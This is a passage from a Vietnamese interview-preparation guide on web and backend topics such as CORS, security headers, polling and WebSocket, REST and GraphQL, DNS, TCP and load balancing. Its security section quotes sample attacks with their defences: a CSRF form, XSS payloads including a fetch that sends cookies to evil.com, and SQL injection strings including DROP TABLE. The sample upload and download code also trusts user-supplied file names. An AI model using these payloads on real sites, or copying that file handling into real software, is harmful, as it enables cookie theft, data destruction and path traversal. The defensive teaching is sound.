Simple Request (không cần preflight):
  - Method: GET, HEAD, POST
  - Headers: chỉ Accept, Content-Type (text/plain, form-data, urlencoded), Accept-Language
  - Không có custom headers

  Client ──── GET /api/data ────────────→ Server
               Origin: https://app.com
  Client ←─── 200 OK ───────────────────── Server
               Access-Control-Allow-Origin: https://app.com


Preflight Request (cần OPTIONS trước):
  - Method: PUT, PATCH, DELETE
  - Hoặc có custom headers (Authorization, Content-Type: application/json)

  Client ──── OPTIONS /api/data ─────────→ Server     (Preflight)
               Origin: https://app.com
               Access-Control-Request-Method: PUT
               Access-Control-Request-Headers: Authorization, Content-Type

  Client ←─── 204 No Content ───────────── Server
               Access-Control-Allow-Origin: https://app.com
               Access-Control-Allow-Methods: GET, POST, PUT, DELETE
               Access-Control-Allow-Headers: Authorization, Content-Type
               Access-Control-Max-Age: 86400   (cache preflight 24h)

  Client ──── PUT /api/data ─────────────→ Server     (Actual request)
               Authorization: Bearer token
  Client ←─── 200 OK ───────────────────── Server
```

### Cấu hình CORS trong Spring:

```java
// Cách 1: Global config
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("https://app.com", "https://admin.app.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE", "PATCH")
            .allowedHeaders("*")
            .allowCredentials(true)     // cho phép gửi cookie
            .maxAge(3600);              // cache preflight 1 giờ
    }
}

// Cách 2: Per controller
@CrossOrigin(origins = "https://app.com")
@RestController
@RequestMapping("/api/users")
public class UserController { }

// Cách 3: Spring Security
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.cors(cors -> cors.configurationSource(request -> {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("https://app.com"));
        config.setAllowedMethods(List.of("*"));
        config.setAllowedHeaders(List.of("*"));
        config.setAllowCredentials(true);
        return config;
    }));
    return http.build();
}
```

---

# D. WEB SECURITY

---

## Q112: CSRF (Cross-Site Request Forgery)?

Kẻ tấn công lừa user thực hiện hành động trên site mà user đã đăng nhập.

```
Kịch bản:
1. User đăng nhập bank.com → có session cookie
2. User truy cập evil.com
3. evil.com chứa:
   <img src="https://bank.com/transfer?to=hacker&amount=10000" />
   hoặc:
   <form action="https://bank.com/transfer" method="POST">
     <input name="to" value="hacker" />
     <input name="amount" value="10000" />
   </form>
   <script>document.forms[0].submit()</script>
4. Browser tự động gửi cookie bank.com → request thành công!

Phòng chống:
1. CSRF Token: server tạo token random, client gửi kèm mỗi request
   → evil.com không biết token
2. SameSite Cookie: SameSite=Strict hoặc Lax
3. Check Origin/Referer header
4. Double Submit Cookie
```

```java
// Spring Security: CSRF mặc định BẬT cho form-based
// REST API stateless (JWT) → thường TẮT CSRF
http.csrf(csrf -> csrf.disable());

// Nếu dùng session-based → giữ CSRF
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
);
// Client phải gửi header: X-XSRF-TOKEN: <value from cookie>
```

---

## Q113: XSS (Cross-Site Scripting)?

Kẻ tấn công inject script vào web page, chạy trong browser của nạn nhân.

```
Stored XSS:
1. Hacker post comment: <script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>
2. Server lưu vào DB
3. User khác xem comment → script chạy → cookie bị đánh cắp

Reflected XSS:
1. Hacker gửi link: https://site.com/search?q=<script>alert('XSS')</script>
2. Server trả: "Kết quả tìm kiếm cho: <script>alert('XSS')</script>"
3. Script chạy trong browser nạn nhân

DOM-based XSS:
1. JavaScript phía client lấy input từ URL/input và chèn vào DOM
   document.getElementById('output').innerHTML = location.hash.slice(1);
2. URL: https://site.com/#<img onerror=alert('XSS') src=x>
```

**Phòng chống:**
```
1. Output Encoding: escape HTML characters
   < → &lt;    > → &gt;    & → &amp;    " → &quot;

2. Input Validation: whitelist allowed characters

3. Content-Security-Policy header:
   Content-Security-Policy: default-src 'self'; script-src 'self'
   → chỉ cho phép script từ cùng origin

4. HttpOnly Cookie: JavaScript không đọc được cookie
   Set-Cookie: session=abc; HttpOnly

5. Thymeleaf tự động escape: th:text="${userInput}" (safe)
   NGUY HIỂM: th:utext="${userInput}" (unescaped!)
```

---

## Q114: SQL Injection?

Kẻ tấn công chèn SQL code qua input.

```
Login form:
  Username: admin' OR '1'='1' --
  Password: anything

Query bị inject:
  SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='anything'
  → Luôn trả về user đầu tiên (admin)

Nguy hiểm hơn:
  Username: '; DROP TABLE users; --
  → Xóa toàn bộ bảng users
```

**Phòng chống:**
```java
// ✗ NGUY HIỂM: String concatenation
String sql = "SELECT * FROM users WHERE email = '" + email + "'";

// ✓ AN TOÀN: PreparedStatement (parameterized query)
PreparedStatement ps = conn.prepareStatement("SELECT * FROM users WHERE email = ?");
ps.setString(1, email);

// ✓ AN TOÀN: JPA/Hibernate
@Query("SELECT u FROM User u WHERE u.email = :email")
User findByEmail(@Param("email") String email);

// ✓ AN TOÀN: Spring Data method
userRepository.findByEmail(email);

// ✗ NGUY HIỂM: Native query với concatenation
@Query(value = "SELECT * FROM users WHERE name = '" + name + "'", nativeQuery = true)
// → KHÔNG BAO GIỜ làm thế này!
```

---

## Q115: Các Security Headers quan trọng?

```
# Chống XSS
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
X-Content-Type-Options: nosniff        → ngăn browser đoán MIME type
X-XSS-Protection: 1; mode=block       → (legacy) kích hoạt XSS filter

# Chống Clickjacking
X-Frame-Options: DENY                  → không cho nhúng trong iframe
X-Frame-Options: SAMEORIGIN            → chỉ iframe từ cùng origin

# HTTPS
Strict-Transport-Security: max-age=31536000; includeSubDomains
→ Browser chỉ dùng HTTPS trong 1 năm

# Thông tin
X-Powered-By: (XÓA header này đi!)    → không lộ technology stack
Server: (XÓA hoặc generic)             → không lộ server software

# Referrer
Referrer-Policy: strict-origin-when-cross-origin
→ Chỉ gửi origin (không full URL) cho cross-origin requests
```

```java
// Spring Security tự thêm nhiều headers
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.headers(headers -> headers
        .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'"))
        .frameOptions(frame -> frame.deny())
        .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000))
    );
    return http.build();
}
```

---

# E. WEB COMMUNICATION PATTERNS

---

## Q116: Polling vs Long Polling vs SSE vs WebSocket?

### Short Polling:
```
Client ──── GET /api/notifications ────→ Server (trả ngay, có hoặc không data)
  (đợi 5s)
Client ──── GET /api/notifications ────→ Server
  (đợi 5s)
Client ──── GET /api/notifications ────→ Server

Ưu: Đơn giản
Nhược: Tốn bandwidth, không real-time, nhiều request thừa
```

### Long Polling:
```
Client ──── GET /api/notifications ────→ Server (HOLD request, chờ data)
                                            ... chờ ...
                                            ... chờ ... (có data mới)
Client ←─── Response with data ─────── Server
Client ──── GET /api/notifications ────→ Server (gửi lại ngay)

Ưu: Gần real-time, ít request thừa
Nhược: Tốn server resources (giữ connections), phức tạp hơn
Ví dụ: Facebook chat cũ
```

### Server-Sent Events (SSE):
```
Client ──── GET /api/stream ──────────→ Server
             Accept: text/event-stream
Client ←─── data: {"msg":"hello"} ──── Server (push data)
Client ←─── data: {"msg":"world"} ──── Server (push data)
Client ←─── data: {"msg":"!"}    ──── Server (push data)
             ... connection giữ mở ...

Ưu: Simple, auto-reconnect, HTTP-based
Nhược: Chỉ ONE-WAY (server → client), text only
Ví dụ: Live score, stock ticker, news feed
```

```java
// Spring SSE
@GetMapping(value = "/stream", produces = MediaType.TEXT_EVENT_STREAM_VALUE)
public Flux<ServerSentEvent<String>> stream() {
    return Flux.interval(Duration.ofSeconds(1))
        .map(i -> ServerSentEvent.<String>builder()
            .id(String.valueOf(i))
            .event("message")
            .data("Event " + i)
            .build());
}
```

### WebSocket:
```
Client ──── HTTP Upgrade Request ─────→ Server
Client ←─── 101 Switching Protocols ── Server
             ═══ Full-duplex TCP ═══
Client ←══→ Bi-directional messages ←══→ Server

Ưu: Full-duplex, real-time, low overhead sau handshake
Nhược: Phức tạp hơn, cần manage connections, không tự reconnect
Ví dụ: Chat app, online game, collaborative editing
```

### So sánh tổng quan:
```
                    Direction      Real-time    Complexity    Use Case
Short Polling       Client→Server  Không        Thấp         Simple status check
Long Polling        Client→Server  Gần          Trung bình   Notifications
SSE                 Server→Client  Có           Thấp         Live feed, logs
WebSocket           Bi-directional Có           Cao          Chat, games, collab
```

---

## Q117: REST vs GraphQL vs gRPC?

| | REST | GraphQL | gRPC |
|--|------|---------|------|
| Protocol | HTTP | HTTP | HTTP/2 |
| Format | JSON/XML | JSON | Protocol Buffers (binary) |
| Contract | OpenAPI/Swagger | Schema + Types | .proto file |
| Over-fetching | Có thể | Không (client chọn fields) | Không |
| Under-fetching | Có thể (cần nhiều calls) | Không (1 query lấy hết) | Không |
| Caching | HTTP caching dễ | Phức tạp hơn | Không có HTTP caching |
| Learning curve | Thấp | Trung bình | Cao |
| Phù hợp | CRUD, public API | Mobile, complex queries | Microservices, real-time |

```
REST:
  GET /api/users/1           → trả toàn bộ user fields (kể cả không cần)
  GET /api/users/1/orders    → request thứ 2 để lấy orders

GraphQL:
  POST /graphql
  query {
    user(id: 1) {
      name
      email
      orders {
        id
        total
      }
    }
  }
  → 1 request, chỉ lấy fields cần thiết

gRPC:
  service UserService {
    rpc GetUser (UserRequest) returns (UserResponse);
    rpc ListUsers (Empty) returns (stream UserResponse);  // streaming
  }
  → Binary, nhanh, type-safe, hỗ trợ streaming
```

---

## Q118: Message Queue vs Event Streaming?

### Message Queue (RabbitMQ, ActiveMQ):
```
Producer ──→ Queue ──→ Consumer

Đặc điểm:
- Mỗi message được consume đúng 1 lần
- Message bị xóa sau khi consumed
- Point-to-point hoặc pub/sub
- Dùng cho: task processing, work distribution

Ví dụ: Gửi email xác nhận sau đặt hàng
  OrderService → [email-queue] → EmailWorker
```

### Event Streaming (Apache Kafka):
```
Producer ──→ Topic (partitioned log) ──→ Consumer Group A
                                    ──→ Consumer Group B

Đặc điểm:
- Messages lưu lâu dài (retention period)
- Nhiều consumer groups đọc cùng message
- Replay được (đọc lại từ offset cũ)
- Ordering đảm bảo trong partition
- Dùng cho: event sourcing, real-time analytics, data pipeline

Ví dụ: Order event → Payment Service đọc, Inventory Service đọc, Analytics đọc
```

```
                Message Queue              Event Stream
Persistence     Tạm thời                   Lâu dài (tuần/tháng)
Consumers       1 consumer/message         Nhiều consumer groups
Replay          Không                      Có (offset-based)
Ordering        Queue-level                Partition-level
Throughput      Trung bình                 Rất cao (triệu msg/s)
Phù hợp        Task queue, RPC            Event sourcing, analytics
```

---

# F. DNS, TCP/IP, OSI MODEL

---

## Q119: DNS hoạt động thế nào?

```
User gõ: www.example.com

1. Browser cache       → có? → dùng luôn IP
2. OS cache (hosts)    → có? → dùng luôn IP
3. Router/ISP DNS      → có? → trả IP
4. Root DNS Server     → trỏ đến .com TLD
5. TLD DNS Server      → trỏ đến example.com nameserver
6. Authoritative DNS   → trả IP: 93.184.216.34

Browser kết nối đến 93.184.216.34

Record Types:
  A      → domain → IPv4 (example.com → 93.184.216.34)
  AAAA   → domain → IPv6
  CNAME  → domain → domain (www.example.com → example.com)
  MX     → mail server (example.com → mail.example.com)
  NS     → nameserver
  TXT    → text record (SPF, DKIM verification)
```

---

## Q120: TCP vs UDP?

| | TCP | UDP |
|--|-----|-----|
| Connection | Connection-oriented (3-way handshake) | Connectionless |
| Reliability | Đảm bảo delivery, ordering, retransmission | Không đảm bảo |
| Speed | Chậm hơn (overhead) | Nhanh hơn |
| Flow control | Có | Không |
| Use case | Web, email, file transfer, API | Video streaming, gaming, DNS, VoIP |

### TCP 3-Way Handshake:
```
Client ──── SYN ──────────→ Server     (tôi muốn kết nối)
Client ←─── SYN-ACK ─────── Server     (OK, tôi cũng sẵn sàng)
Client ──── ACK ──────────→ Server     (xác nhận, bắt đầu!)

Đóng kết nối (4-Way):
Client ──── FIN ──────────→ Server
Client ←─── ACK ─────────── Server
Client ←─── FIN ─────────── Server
Client ──── ACK ──────────→ Server
```

---

## Q121: Mô hình OSI 7 tầng?

```
Layer 7: Application    │ HTTP, FTP, SMTP, DNS, WebSocket
Layer 6: Presentation   │ SSL/TLS, encryption, compression, JSON/XML encoding
Layer 5: Session        │ Session management, authentication
Layer 4: Transport      │ TCP, UDP (port numbers)
Layer 3: Network        │ IP, routing (IP addresses)
Layer 2: Data Link      │ Ethernet, WiFi, MAC addresses
Layer 1: Physical       │ Cables, signals, bits

Nhớ: "All People Seem To Need Data Processing"
       A    P      S    T    N     D     P

Thực tế hay dùng mô hình TCP/IP 4 tầng:
  Application    = OSI 7+6+5
  Transport      = OSI 4
  Internet       = OSI 3
  Network Access = OSI 2+1
```

---

## Q122: Từ khi gõ URL đến khi thấy trang web — chuyện gì xảy ra?

```
1. User gõ "https://www.example.com/page"

2. DNS Resolution
   → Browser cache → OS cache → Router → ISP DNS → Root → TLD → Authoritative
   → Nhận IP: 93.184.216.34

3. TCP Connection
   → 3-way handshake (SYN → SYN-ACK → ACK)

4. TLS Handshake (vì HTTPS)
   → ClientHello → ServerHello + Certificate → Key Exchange → Encrypted

5. HTTP Request
   → GET /page HTTP/1.1
   → Host: www.example.com

6. Server Processing
   → Load balancer → Web server → App server → Database
   → Generate response

7. HTTP Response
   → HTTP/1.1 200 OK
   → Content-Type: text/html
   → Body: HTML content

8. Browser Rendering
   a. Parse HTML → DOM Tree
   b. Parse CSS → CSSOM Tree
   c. Combine → Render Tree
   d. Layout (tính vị trí, kích thước)
   e. Paint (vẽ pixels)
   f. Composite (ghép layers)

9. Additional Resources
   → Gặp <script>, <link>, <img> → gửi thêm HTTP requests
   → JavaScript execute → có thể modify DOM

10. Page Interactive
    → DOMContentLoaded event
    → Load event (tất cả resources đã tải)
```

---

# G. API DESIGN & BEST PRACTICES

---

## Q123: HATEOAS là gì?

**HATEOAS (Hypermedia As The Engine Of Application State):** Level cao nhất của REST maturity (Richardson Maturity Model Level 3). Response chứa links cho phép client biết các hành động tiếp theo.

```json
// GET /api/orders/42
{
  "id": 42,
  "status": "PENDING",
  "total": 150.00,
  "_links": {
    "self": { "href": "/api/orders/42" },
    "cancel": { "href": "/api/orders/42/cancel", "method": "POST" },
    "pay": { "href": "/api/orders/42/pay", "method": "POST" },
    "items": { "href": "/api/orders/42/items" }
  }
}

// Sau khi pay, response thay đổi:
{
  "id": 42,
  "status": "PAID",
  "_links": {
    "self": { "href": "/api/orders/42" },
    "refund": { "href": "/api/orders/42/refund", "method": "POST" }
    // không còn link "cancel" hay "pay"
  }
}
```

**Richardson Maturity Model:**
```
Level 0: One URI, one method (RPC-style)    POST /api
Level 1: Resources                          /api/users, /api/orders
Level 2: HTTP Methods + Status Codes        GET, POST, 200, 404...
Level 3: HATEOAS (hypermedia controls)      _links trong response
```

---

## Q124: Idempotency trong API?

**Idempotent:** Gọi nhiều lần cho cùng kết quả.

```
GET /users/1          → Idempotent ✓  (đọc, không thay đổi gì)
PUT /users/1          → Idempotent ✓  (set state, gọi lại = cùng state)
DELETE /users/1       → Idempotent ✓  (xóa rồi xóa lại = vẫn xóa)
POST /users           → KHÔNG ✗       (mỗi lần tạo user mới)

Xử lý idempotency cho POST:
  Client gửi kèm Idempotency-Key header
  Server lưu key + response
  Nếu nhận lại cùng key → trả response cũ, không xử lý lại
```

```java
@PostMapping("/payments")
public ResponseEntity<Payment> createPayment(
    @RequestHeader("Idempotency-Key") String idempotencyKey,
    @RequestBody PaymentRequest request) {

    // Kiểm tra key đã xử lý chưa
    Optional<Payment> existing = paymentRepo.findByIdempotencyKey(idempotencyKey);
    if (existing.isPresent()) {
        return ResponseEntity.ok(existing.get()); // trả kết quả cũ
    }
    
    // Xử lý payment mới
    Payment payment = processPayment(request);
    payment.setIdempotencyKey(idempotencyKey);
    paymentRepo.save(payment);
    return ResponseEntity.status(201).body(payment);
}
```

---

## Q125: Content Negotiation?

Client và server thỏa thuận format data.

```
Request:
  GET /api/users/1
  Accept: application/json         → muốn JSON
  Accept: application/xml          → muốn XML
  Accept: text/html                → muốn HTML
  Accept: application/json, application/xml;q=0.9
     → ưu tiên JSON (q=1.0 mặc định), XML là backup (q=0.9)

Response:
  Content-Type: application/json   → trả JSON
```

```java
// Spring tự động negotiate dựa trên Accept header
@GetMapping(value = "/users/{id}",
    produces = { MediaType.APPLICATION_JSON_VALUE, MediaType.APPLICATION_XML_VALUE })
public User getUser(@PathVariable Long id) {
    return userService.findById(id);
}
```

---

## Q126: ETag và Conditional Requests (Caching)?

```
Lần 1 — Client lấy resource:
  GET /api/products/1

  Response:
  200 OK
  ETag: "abc123"
  Cache-Control: max-age=60
  { "name": "Phone", "price": 999 }

Lần 2 (trong 60s) — Browser dùng cache, KHÔNG gọi server

Lần 3 (sau 60s) — Cache hết hạn, client gửi conditional request:
  GET /api/products/1
  If-None-Match: "abc123"         → gửi ETag cũ

  Nếu CHƯA thay đổi:
  304 Not Modified                → dùng cache, không gửi body (tiết kiệm bandwidth)

  Nếu ĐÃ thay đổi:
  200 OK
  ETag: "def456"                  → ETag mới
  { "name": "Phone Pro", "price": 1299 }
```

```java
// Spring ETag support
@GetMapping("/products/{id}")
public ResponseEntity<Product> getProduct(@PathVariable Long id) {
    Product product = productService.findById(id);
    String etag = "\"" + product.getVersion() + "\"";  // dùng version làm ETag
    
    return ResponseEntity.ok()
        .eTag(etag)
        .cacheControl(CacheControl.maxAge(60, TimeUnit.SECONDS))
        .body(product);
}

// Hoặc dùng ShallowEtagHeaderFilter (tự động tính ETag từ response body)
@Bean
public FilterRegistrationBean<ShallowEtagHeaderFilter> etagFilter() {
    FilterRegistrationBean<ShallowEtagHeaderFilter> bean = new FilterRegistrationBean<>();
    bean.setFilter(new ShallowEtagHeaderFilter());
    bean.addUrlPatterns("/api/*");
    return bean;
}
```

---

## Q127: Multipart Upload và File handling?

```java
@RestController
@RequestMapping("/api/files")
public class FileController {

    @PostMapping("/upload")
    public ResponseEntity<FileResponse> upload(
            @RequestParam("file") MultipartFile file,
            @RequestParam(value = "description", required = false) String desc) {
        
        // Validate
        if (file.isEmpty()) throw new BadRequestException("File is empty");
        if (file.getSize() > 10 * 1024 * 1024) throw new BadRequestException("Max 10MB");
        
        String contentType = file.getContentType();
        if (!List.of("image/jpeg", "image/png", "application/pdf").contains(contentType)) {
            throw new BadRequestException("Unsupported file type");
        }
        
        // Save
        String fileName = UUID.randomUUID() + "_" + file.getOriginalFilename();
        Path path = Paths.get("uploads").resolve(fileName);
        Files.copy(file.getInputStream(), path);
        
        return ResponseEntity.status(201)
            .body(new FileResponse(fileName, file.getSize(), contentType));
    }

    @GetMapping("/download/{fileName}")
    public ResponseEntity<Resource> download(@PathVariable String fileName) {
        Path path = Paths.get("uploads").resolve(fileName);
        Resource resource = new UrlResource(path.toUri());
        
        return ResponseEntity.ok()
            .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + fileName + "\"")
            .contentType(MediaType.APPLICATION_OCTET_STREAM)
            .body(resource);
    }
}
```

```yaml
spring:
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 10MB
```

---

# H. LOAD BALANCING & PROXY

---

## Q128: Forward Proxy vs Reverse Proxy?

```
Forward Proxy (đại diện cho CLIENT):
  Client ──→ [Forward Proxy] ──→ Internet ──→ Server
  
  Mục đích:
  - Ẩn IP client
  - Bypass restrictions (VPN)
  - Cache, filtering
  Ví dụ: Corporate proxy, VPN

Reverse Proxy (đại diện cho SERVER):
  Client ──→ Internet ──→ [Reverse Proxy] ──→ Server(s)
  
  Mục đích:
  - Load balancing
  - SSL termination
  - Caching
  - DDoS protection
  - Hide server architecture
  Ví dụ: Nginx, HAProxy, AWS ALB
```

---

## Q129: Load Balancing Algorithms?

```
1. Round Robin:
   Request 1 → Server A
   Request 2 → Server B
   Request 3 → Server C
   Request 4 → Server A (lặp lại)

2. Weighted Round Robin:
   Server A (weight 3): nhận 3 requests
   Server B (weight 1): nhận 1 request

3. Least Connections:
   → Gửi đến server có ít connection nhất

4. IP Hash:
   → Hash client IP → luôn đến cùng server (sticky session)

5. Random:
   → Chọn ngẫu nhiên

6. Least Response Time:
   → Gửi đến server có response time thấp nhất
```

```
                     ┌─── Server A (port 8081)
                     │
Client ──→ Nginx ────┼─── Server B (port 8082)
           (LB)      │
                     └─── Server C (port 8083)
```

```nginx
# Nginx config
upstream backend {
    least_conn;                    # thuật toán
    server 192.168.1.1:8081;
    server 192.168.1.2:8082;
    server 192.168.1.3:8083 weight=2;   # server này nhận gấp đôi
    server 192.168.1.4:8084 backup;     # chỉ dùng khi server khác down
}

server {
    listen 80;
    location / {
        proxy_pass http://backend;
    }
}
```

---

## Q130: CDN (Content Delivery Network)?

```
Không có CDN:
  User (Việt Nam) ──── 200ms ────→ Server (US)

Có CDN:
  User (Việt Nam) ──── 20ms ────→ CDN Edge (Singapore) ──cache miss──→ Server (US)
                                   (lần sau: trả từ cache, không cần đến US)

CDN cache:
- Static files: JS, CSS, images, fonts, videos
- API responses (nếu config)

CDN providers: Cloudflare, AWS CloudFront, Akamai, Fastly

Headers liên quan:
  Cache-Control: public, max-age=31536000    → cache 1 năm
  Cache-Control: private, no-cache           → không cache ở CDN
  Vary: Accept-Encoding                      → cache theo encoding
```

---

# I. ENCODING, SERIALIZATION

---

## Q131: Encoding vs Encryption vs Hashing?

```
Encoding (mã hóa dạng):
  - Chuyển đổi format, KHÔNG bảo mật
  - Có thể decode ngược
  - Ví dụ: Base64, URL encoding, UTF-8
  - "Hello" → Base64 → "SGVsbG8="

Encryption (mã hóa bảo mật):
  - Bảo mật data, cần KEY để decrypt
  - Symmetric (AES): 1 key cho cả encrypt và decrypt
  - Asymmetric (RSA): public key encrypt, private key decrypt
  - "Hello" + key → "x8f2k..." → key → "Hello"

Hashing (băm):
  - ONE-WAY, KHÔNG thể reverse
  - Cùng input → luôn cùng output
  - Khác input → khác output (collision-resistant)
  - Ví dụ: SHA-256, bcrypt, MD5 (weak)
  - "Hello" → SHA-256 → "2cf24dba5fb0a30e..."
  - Dùng cho: lưu password, checksum, digital signature

Password storage:
  ĐÚNG:  bcrypt("password" + salt) → "$2a$10$N9qo8uLO..."
  SAI:   MD5("password") → "5f4dcc3b..."  (dễ bị rainbow table attack)
```

---

## Q132: JSON vs XML? Serialization/Deserialization?

```json
// JSON (JavaScript Object Notation)
{
  "name": "John",
  "age": 30,
  "address": {
    "city": "Hanoi"
  },
  "hobbies": ["reading", "coding"]
}
```

```xml
<!-- XML (eXtensible Markup Language) -->
<person>
  <name>John</name>
  <age>30</age>
  <address>
    <city>Hanoi</city>
  </address>
  <hobbies>
    <hobby>reading</hobby>
    <hobby>coding</hobby>
  </hobbies>
</person>
```

```
            JSON              XML
Size        Nhỏ hơn           Lớn hơn (tags dài)
Readability Dễ đọc            Verbose
Parsing     Nhanh             Chậm hơn
Data types  string, number,   Tất cả là text
            boolean, null,
            array, object
Schema      JSON Schema       XSD
Namespace   Không             Có
Phổ biến    REST API, config  SOAP, legacy enterprise
```

```java
// Jackson: Serialization/Deserialization trong Spring
// Object → JSON (Serialization)
ObjectMapper mapper = new ObjectMapper();
String json = mapper.writeValueAsString(user);

// JSON → Object (Deserialization)
User user = mapper.readValue(json, User.class);

// Custom serialization
@JsonProperty("full_name")        // đổi tên field trong JSON
private String name;

@JsonIgnore                       // không include trong JSON
private String password;

@JsonFormat(pattern = "dd-MM-yyyy")  // format date
private LocalDate birthDate;

@JsonInclude(JsonInclude.Include.NON_NULL)  // bỏ qua null fields
public class UserDTO { }
```

---

## Q133: URL Encoding là gì?

URL chỉ chấp nhận một số ký tự ASCII. Các ký tự đặc biệt phải được encode.

```
Space  → %20 hoặc +
!      → %21
#      → %23
$      → %24
&      → %26
+      → %2B
/      → %2F
?      → %3F
@      → %40

Ví dụ:
  Trước: https://example.com/search?q=hello world&lang=vi
  Sau:   https://example.com/search?q=hello%20world&lang=vi

  Trước: https://example.com/users/john@email.com
  Sau:   https://example.com/users/john%40email.com
```

```java
// Java URL encoding
String encoded = URLEncoder.encode("hello world", StandardCharsets.UTF_8);
// → "hello+world"

String decoded = URLDecoder.decode("hello+world", StandardCharsets.UTF_8);
// → "hello world"
```

---

# J. CÂU HỎI TỔNG HỢP NHANH

---

## Q134: Stateless vs Stateful?

```
Stateless:
  - Server KHÔNG lưu thông tin giữa các requests
  - Mỗi request chứa đủ thông tin để xử lý
  - Dễ scale (bất kỳ server nào cũng xử lý được)
  - Ví dụ: REST API với JWT

Stateful:
  - Server LƯU trạng thái client (session, connection state)
  - Requests phụ thuộc vào context trước đó
  - Khó scale (cần sticky session hoặc shared state)
  - Ví dụ: WebSocket connection, FTP session
```

---

## Q135: Synchronous vs Asynchronous?

```
Synchronous (đồng bộ):
  Client ──request──→ Server
  Client    chờ...    Server xử lý...
  Client ←─response── Server
  → Client BỊ BLOCK cho đến khi nhận response

Asynchronous (bất đồng bộ):
  Client ──request──→ Server
  Client tiếp tục     Server xử lý...
  làm việc khác...
  Client ←─callback── Server (khi xong)
  → Client KHÔNG BỊ BLOCK

  Cách triển khai:
  1. Callback
  2. Future/Promise
  3. Message Queue
  4. WebSocket
  5. Reactive (WebFlux)
```

```java
// Sync
RestTemplate restTemplate = new RestTemplate();
User user = restTemplate.getForObject("/api/users/1", User.class); // blocking

// Async với CompletableFuture
@Async
public CompletableFuture<User> getUserAsync(Long id) {
    User user = restTemplate.getForObject("/api/users/" + id, User.class);
    return CompletableFuture.completedFuture(user);
}

// Reactive (non-blocking)
WebClient webClient = WebClient.create();
Mono<User> user = webClient.get()
    .uri("/api/users/1")
    .retrieve()
    .bodyToMono(User.class);  // non-blocking
```

---

## Q136: Blocking vs Non-Blocking I/O?

```
Blocking I/O (Spring MVC - thread-per-request):
  Thread 1 ──→ handleRequest() ──→ DB query (chờ) ──→ response
  Thread 2 ──→ handleRequest() ──→ DB query (chờ) ──→ response
  Thread 3 ──→ handleRequest() ──→ DB query (chờ) ──→ response
  → Mỗi request chiếm 1 thread, thread bị block khi chờ I/O
  → 200 threads = tối đa 200 concurrent requests

Non-Blocking I/O (Spring WebFlux - event loop):
  Event Loop ──→ nhận request 1 ──→ gửi DB query (không chờ) ──→ nhận request 2
              ──→ gửi DB query (không chờ) ──→ nhận request 3
              ←── DB response 1 ──→ trả response 1
              ←── DB response 2 ──→ trả response 2
  → 1 thread xử lý hàng nghìn connections
  → Phù hợp: high concurrency, I/O-bound tasks
```

---

## Q137: Redirect vs Forward?

```
Redirect (client-side):
  Client ──→ Server: GET /old-page
  Client ←── Server: 302 Found, Location: /new-page
  Client ──→ Server: GET /new-page          (request MỚI, URL thay đổi)
  Client ←── Server: 200 OK

  - URL trên browser THAY ĐỔI
  - 2 HTTP requests
  - Không chia sẻ request attributes
  - Dùng khi: sau POST (PRG pattern), chuyển domain

Forward (server-side):
  Client ──→ Server: GET /page-a
               Server nội bộ chuyển đến /page-b (client không biết)
  Client ←── Server: Response từ /page-b

  - URL trên browser KHÔNG đổi
  - 1 HTTP request
  - Chia sẻ request attributes
  - Dùng khi: chuyển giữa các Servlet/JSP nội bộ
```

```java
// Redirect
@PostMapping("/users")
public String createUser(User user) {
    userService.save(user);
    return "redirect:/users";  // PRG pattern: Post → Redirect → Get
}

// Forward
@GetMapping("/old-api")
public String oldApi() {
    return "forward:/new-api";  // server-side, client không biết
}
```

---

## Q138: Webhook là gì?

**Webhook = Reverse API.** Thay vì client polling server, server gọi lại client khi có event.

```
Polling (client chủ động):
  Client ──→ GET /status ──→ Server (chưa có gì)
  Client ──→ GET /status ──→ Server (chưa có gì)
  Client ──→ GET /status ──→ Server (có data!) ←── tốn nhiều request thừa

Webhook (server chủ động):
  Client đăng ký: POST /webhooks { "url": "https://myapp.com/callback", "event": "payment.completed" }
  
  ... thời gian trôi qua ...
  
  Khi event xảy ra:
  Server ──→ POST https://myapp.com/callback
             { "event": "payment.completed", "data": { "amount": 100 } }
```

```java
// Nhận webhook
@RestController
@RequestMapping("/webhooks")
public class WebhookController {

    @PostMapping("/payment")
    public ResponseEntity<Void> handlePaymentWebhook(
            @RequestBody PaymentEvent event,
            @RequestHeader("X-Webhook-Signature") String signature) {
        
        // 1. Verify signature (bảo mật!)
        if (!verifySignature(event, signature)) {
            return ResponseEntity.status(401).build();
        }
        
        // 2. Process event (nên async để trả 200 nhanh)
        asyncProcessor.process(event);
        
        // 3. Trả 200 ngay (webhook sender sẽ retry nếu không nhận 2xx)
        return ResponseEntity.ok().build();
    }
}
```

**Ví dụ thực tế:** Stripe/PayPal gọi webhook khi thanh toán thành công, GitHub gọi webhook khi có push/PR.

---

## Q139: API Gateway là gì?

```
Không có Gateway:
  Client ──→ User Service     (phải biết URL từng service)
  Client ──→ Order Service
  Client ──→ Payment Service
  Client ──→ Notification Service

Có Gateway:
  Client ──→ API Gateway ──→ User Service
                          ──→ Order Service
                          ──→ Payment Service
                          ──→ Notification Service
```

**Chức năng API Gateway:**
```
1. Routing:          /api/users → User Service, /api/orders → Order Service
2. Authentication:   Xác thực JWT/OAuth trước khi forward
3. Rate Limiting:    Giới hạn requests per client
4. Load Balancing:   Phân tải giữa instances
5. Caching:          Cache responses
6. Request/Response: Transform headers, body
7. Circuit Breaking: Ngăn cascade failure
8. Logging/Monitoring: Centralized logging
9. SSL Termination:  Xử lý HTTPS tại gateway
10. API Versioning:  Route /v1/* và /v2/* khác nhau
```

```java
// Spring Cloud Gateway
@Bean
public RouteLocator routes(RouteLocatorBuilder builder) {
    return builder.routes()
        .route("user-service", r -> r
            .path("/api/users/**")
            .filters(f -> f
                .stripPrefix(1)
